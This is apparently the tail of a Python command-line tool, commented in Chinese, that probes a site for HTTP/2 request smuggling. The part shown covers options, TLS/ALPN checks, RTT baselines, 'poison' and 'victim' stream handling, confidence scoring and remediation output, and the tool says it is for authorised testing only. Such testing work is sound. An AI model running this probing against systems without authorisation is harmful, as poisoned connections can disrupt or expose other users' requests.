        for tag, s in (('S1(poison)', rec.s1), ('S3(victim)', rec.s3)):
            if s is None:
                parts.append(f'--- {tag} : <无流记录> ---')
                continue
            hdr_txt = '; '.join(f'{_dec(k)}={_dec(v)}' for k, v in s.headers)
            parts += [f'--- {tag} status={s.status} rst={s.rst} '
                      f'ended={s.ended} hpack_err={s.hpack_error} ---',
                      f'headers: {hdr_txt}',
                      f'body({len(s.body)}B): {_dec(decode_stream_body(s))[:600]}']
        if a:
            parts.append(f'--- EVIDENCE (score {a.score} → {a.confidence}) ---')
            for e in a.evidences:
                parts.append(f'  [{EV_WEIGHTS[e.code]:>2}] {e.code}: {e.detail}')
        (self.raw_dir / (rec.probe_id + '.txt')).write_text(
            '\n'.join(parts), encoding='utf-8')


# ─── 主流程 ───────────────────────────────────────────────────────────────────
def main(argv=None) -> int:
    ap = argparse.ArgumentParser(
        description='HTTP/2 请求走私探测工具 v2（H2.CL/H2.TE/H2.SPLIT + 基线 + H3 提示，'
                    '仅供授权测试）')
    ap.add_argument('--url', help='探测目标 URL（必填，https，必须支持 ALPN h2）')
    ap.add_argument('--h2-tech', default='all',
                    help='H2 技术标识（逗号分隔）或 all：h2_cl,h2_cl0,h2_te,h2_split')
    ap.add_argument('--mode', choices=['both', 'hang', 'shift'], default='both')
    ap.add_argument('--rounds', type=int, default=3)
    ap.add_argument('--baseline', type=int, default=3,
                    help='探测前 RTT 基线采样条数（F5）')
    ap.add_argument('--delay', type=float, default=0.5,
                    help='固定毒化等待秒数（仅在 --no-adaptive-delay 时生效）')
    ap.add_argument('--no-adaptive-delay', action='store_true',
                    help='禁用按基线 p95 RTT 的自适应毒化等待，改用固定 --delay')
    ap.add_argument('--phase-timeout', type=float, default=4.0)
    ap.add_argument('--connect-timeout', type=float, default=10.0)
    ap.add_argument('--size-limit', type=int, default=1048576,
                    help='单连接接收字节上限（F9，超限记 size-limit）')
    ap.add_argument('--repro-threshold', type=int, default=2,
                    help='definitive 证据升级 HIGH 所需复现轮数')
    ap.add_argument('--out', default='smuggle_out_h2')
    ap.add_argument('--insecure', action='store_true',
                    help='跳过 TLS 证书与主机名校验（默认开启校验；IP 目标不发送 SNI）')
    ap.add_argument('--list-tech', action='store_true')
    args = ap.parse_args(argv)

    if args.list_tech:
        for t in H2_TECHNIQUES:
            print(f'{t.key:<12} {t.name:<10} modes={",".join(t.modes):<11} '
                  f'{t.description}')
        return 0

    # F12：目标必须显式提供，无硬编码默认值
    raw_url = args.url
    if not raw_url:
        try:
            raw_url = input('输入已授权的探测目标 URL（必填，如 https://example.com）: ')
        except EOFError:
            print('[!] 非交互环境（EOF），请通过 --url 指定目标')
            return 1
    try:
        target = parse_target(raw_url)
    except ValueError as e:
        print(f'[!] 目标解析失败: {e}')
        return 1

    cfg = ProbeConfig(
        rounds=args.rounds, baseline_samples=args.baseline,
        mode=args.mode, protocol='h2',
        fingerprint=True,
        connect_timeout=args.connect_timeout,
        ttfb_timeout=args.phase_timeout, phase_timeout=args.phase_timeout,
        delay=args.delay, size_limit=args.size_limit, insecure=args.insecure,
        adaptive_delay=not args.no_adaptive_delay,
        repro_threshold=args.repro_threshold, out_dir=Path(args.out),
    )

    if not target.use_tls:
        print('[!] H2 探测需要 TLS（h2c 明文升级本版不支持）；'
              '明文目标请使用 HTTP/1.1 探测模块')
        return 1
    alpn = probe_alpn(target, cfg)
    if alpn != 'h2':
        print(f'[!] 前端 ALPN={alpn!r}（未提供 h2），无法执行 H2 探测')
        return 1

    try:
        h2_techs = select_h2_techniques(args.h2_tech)
    except SystemExit as e:
        print(str(e))
        return 1
    runnable = [(t, h2_modes_of(cfg, t)) for t in h2_techs]
    skipped = [t.name for t, m in runnable if not m]
    if skipped:
        print(f'[i] 跳过与 --mode {cfg.mode} 不相交的技术: {", ".join(skipped)}')
    h2_techs = [t for t, m in runnable if m]
    if not h2_techs:
        print('[!] 无可执行技术（全部被 --mode 过滤）')
        return 1

    print('HTTP/2 Request Smuggling 探测工具 v2（仅供授权渗透测试使用）')
    print(f'目标 : {target.host}:{target.port} (TLS={target.use_tls} '
          f'ALPN={alpn} 校验={"关闭" if cfg.insecure else "开启"}'
          f'{" [IP直连/SNI跳过]" if cfg.insecure and target.is_ip else ""})')
    print(f'路径 : {_dec(target.path)}   Host 头: {_dec(target.host_header)}')
    print(f'技术 : H2×{len(h2_techs)} | 模式 {cfg.mode} × {cfg.rounds} 轮 | '
          f'基线 {cfg.baseline_samples} 条')

    artifacts = H2Artifacts(cfg.out_dir)

    # F5：RTT 基线
    baseline = collect_rtt_baseline(target, cfg, cfg.baseline_samples)
    if baseline.ok:
        print(f'基线 : n={len(baseline.rtts_ms)} statuses={sorted(baseline.statuses)} '
              f'rtt p50={baseline.p50_ms and round(baseline.p50_ms)}ms '
              f'p95={baseline.p95_ms and round(baseline.p95_ms)}ms '
              f'max={baseline.max_ms and round(baseline.max_ms)}ms')
    else:
        print('[!] 基线采集失败（目标不可达或无响应），差分证据可能不可用')

    h3_hint = None
    try:
        h3_hint = probe_h3_hint(target, cfg)
        print_h3_hint(h3_hint)
    except KeyboardInterrupt:
        raise
    except Exception as e:
        print(f'[i] H3 提示模块异常（忽略）: {type(e).__name__}: {e}')

    try:
        verdicts = run_h2_session(target, cfg, h2_techs, artifacts, baseline)
    except KeyboardInterrupt:
        print('\n[!] 用户中断')
        return 130

    order = {'HIGH': 3, 'MEDIUM': 2, 'LOW': 1}
    lines = []
    for _, v in sorted(verdicts, key=lambda x: -order.get(x[1].confidence, 0)):
        repro = ', '.join(f'{c} {h}/{n}'
                          for c, (h, n) in v.evidence_repro.items()) or '-'
        lines.append(f'[{v.confidence:<6}] {v.technique}/{v.mode:<5} '
                     f'{repro:<30} {v.verdict}')
    section('H2 全技术综合汇总', '\n'.join(lines))

    if verdicts:
        best = max(verdicts, key=lambda x: (order.get(x[1].confidence, 0),
                                            max((r.score for r in x[1].rounds),
                                                default=0)))
        _, v = best
        detail = [f'结论: {v.confidence} — {v.verdict}',
                  '各轮: ' + ' | '.join(
                      f'r{i + 1}: score={r.score} {r.confidence}'
                      for i, r in enumerate(v.rounds))]
        rec = v.best_record
        if rec is not None:
            s1s = rec.s1.status if rec.s1 else '-'
            s3s = rec.s3.status if rec.s3 else '-'
            detail += [
                f'证据最高轮次: {rec.probe_id} (score {rec.analysis.score}) [HTTP/2]',
                f'毒包流 s1={s1s} rst={rec.s1.rst if rec.s1 else None}  '
                f'victim流 s3={s3s}  conn_error={rec.conn_error}',
                f's1 headers: {[(_dec(k), _dec(vv)) for k, vv in rec.s1.headers][:12] if rec.s1 else "-"}',
                f's3 headers: {[(_dec(k), _dec(vv)) for k, vv in rec.s3.headers][:12] if rec.s3 else "-"}',
                f's3 body 前 400 字符: '
                f'{_dec(decode_stream_body(rec.s3))[:400] if rec.s3 else "-"}',
            ]
        detail.append(f'全部轮次原始数据: {artifacts.raw_dir}')
        section(f'最高证据详情: {v.technique}/{v.mode}', '\n'.join(detail))

    print_remediation(remediation_for(verdicts))

    high = [f'{v.technique}/{v.mode}' for _, v in verdicts if v.confidence == 'HIGH']
    medium = [f'{v.technique}/{v.mode}' for _, v in verdicts
              if v.confidence == 'MEDIUM']
    if high:
        print(f'\n[!] 高危: {", ".join(high)} — 请仅在授权范围内进一步验证。')
    elif medium:
        print(f'\n[i] 中置信: {", ".join(medium)} — 建议加轮复现或人工复核。')

    artifacts.save_report(build_report(target, cfg, verdicts, alpn=alpn,
                                       fingerprint=h3_hint, baseline=baseline,
                                       version='V3.2-h2-v2.1'))
    print(f'\n工件目录: {artifacts.dir}')

    # F14：退出码分级 0/1/2
    if high:
        return 2
    if medium:
        return 1
    return 0


if __name__ == '__main__':
    sys.exit(main())